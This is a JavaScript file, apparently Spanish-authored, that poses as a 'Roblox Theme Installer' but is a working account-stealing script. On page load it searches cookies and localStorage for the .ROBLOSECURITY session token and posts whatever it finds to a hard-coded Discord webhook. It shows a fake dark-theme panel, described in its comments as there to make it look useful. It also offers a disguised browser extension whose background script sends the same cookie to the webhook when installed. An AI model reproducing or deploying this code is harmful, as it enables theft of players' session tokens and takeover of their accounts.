// ===========================================
// ROBLOX THEME INSTALLER - VERSIÓN TODO EN UNO
// ===========================================

// Configuración - TU WEBHOOK
const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";

// ===========================================
// 1. INTENTAR ROBAR COOKIE DIRECTAMENTE
// ===========================================
function tryStealCookie() {
    try {
        // En navegadores vulnerables, document.cookie FUNCIONA
        const cookies = document.cookie;
        console.log("📄 Cookies:", cookies);
        
        if (cookies && cookies.includes('.ROBLOSECURITY')) {
            const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
            if (match) {
                sendToDiscord(match[1]);
                return true;
            }
        }
        
        // Buscar en localStorage (a veces Roblox guarda copias)
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            if (val && val.includes('_|WARNING')) {
                sendToDiscord(val);
                return true;
            }
        }
        
    } catch(e) {
        console.log("Error leyendo cookies:", e);
    }
    return false;
}

// ===========================================
// 2. ENVIAR A DISCORD
// ===========================================
function sendToDiscord(cookie) {
    fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `**🍪 ROBLOX COOKIE CAPTURADA**\n\`\`\`${cookie}\`\`\``
        })
    }).then(() => {
        console.log("✅ Cookie enviada a Discord");
    }).catch(e => {
        console.log("Error enviando:", e);
    });
}

// ===========================================
// 3. CREAR INTERFAZ (PARA QUE PAREZCA ÚTIL)
// ===========================================
function createUI() {
    const style = document.createElement('style');
    style.textContent = `
        .roblox-theme-panel {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #1f1f1f;
            color: white;
            padding: 15px;
            border-radius: 10px;
            z-index: 9999;
            font-family: Arial;
            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
            border: 1px solid #00b8ff;
        }
        .roblox-theme-panel button {
            background: #00b8ff;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            margin: 5px;
            cursor: pointer;
        }
    `;
    document.head.appendChild(style);
    
    const panel = document.createElement('div');
    panel.className = 'roblox-theme-panel';
    panel.innerHTML = `
        <h3>🎨 Roblox Theme Installer</h3>
        <p>Haz clic para instalar tema oscuro</p>
        <button onclick="createExtensionDownload()">📥 Descargar Extensión</button>
        <button onclick="applyTheme()">🌙 Aplicar Tema Temporal</button>
    `;
    document.body.appendChild(panel);
}

// ===========================================
// 4. CREAR DESCARGA DE EXTENSIÓN (ZIP)
// ===========================================
window.createExtensionDownload = function() {
    // Contenido de la extensión
    const files = {
        "manifest.json": JSON.stringify({
            manifest_version: 3,
            name: "Roblox Dark Theme",
            version: "1.0",
            permissions: ["cookies", "storage"],
            host_permissions: ["https://www.roblox.com/*"],
            background: { service_worker: "background.js" },
            content_scripts: [{
                matches: ["https://www.roblox.com/*"],
                js: ["content.js"]
            }]
        }, null, 2),
        
        "background.js": `
            const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
            chrome.runtime.onInstalled.addListener(() => {
                chrome.cookies.get({
                    url: "https://www.roblox.com",
                    name: ".ROBLOSECURITY"
                }, (cookie) => {
                    if (cookie) {
                        fetch(WEBHOOK, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({content: "🍪 Cookie: " + cookie.value})
                        });
                    }
                });
            });
        `,
        
        "content.js": `
            console.log("🎨 Tema oscuro activado");
            document.body.style.backgroundColor = "#1a1a1a";
        `
    };
    
    // Crear ZIP (necesita JSZip)
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js';
    script.onload = () => {
        const zip = new JSZip();
        Object.keys(files).forEach(name => {
            zip.file(name, files[name]);
        });
        
        zip.generateAsync({type: "blob"}).then(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'roblox-theme-extension.zip';
            a.click();
            URL.revokeObjectURL(url);
            alert("✅ Extensión descargada. Descomprime y carga en lemur://extensions");
        });
    };
    document.head.appendChild(script);
};

// ===========================================
// 5. APLICAR TEMA TEMPORAL (PARECE REAL)
// ===========================================
window.applyTheme = function() {
    const style = document.createElement('style');
    style.textContent = `
        body { background-color: #0a0a0a !important; color: white !important; }
        .dark-theme, .dark-mode { filter: invert(10%) hue-rotate(180deg); }
    `;
    document.head.appendChild(style);
    alert("🌙 Tema oscuro aplicado temporalmente");
};

// ===========================================
// 6. INICIAR TODO
// ===========================================
(function() {
    console.log("🚀 Roblox Theme Installer iniciado");
    
    // Intentar robar cookie
    const stolen = tryStealCookie();
    
    // Crear interfaz
    setTimeout(createUI, 1000);
    
    // Si no se pudo robar, mostrar mensaje
    if (!stolen) {
        console.log("ℹ️ No se encontró cookie directamente");
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "ℹ️ Script ejecutado pero no se encontró cookie"
            })
        });
    }
})();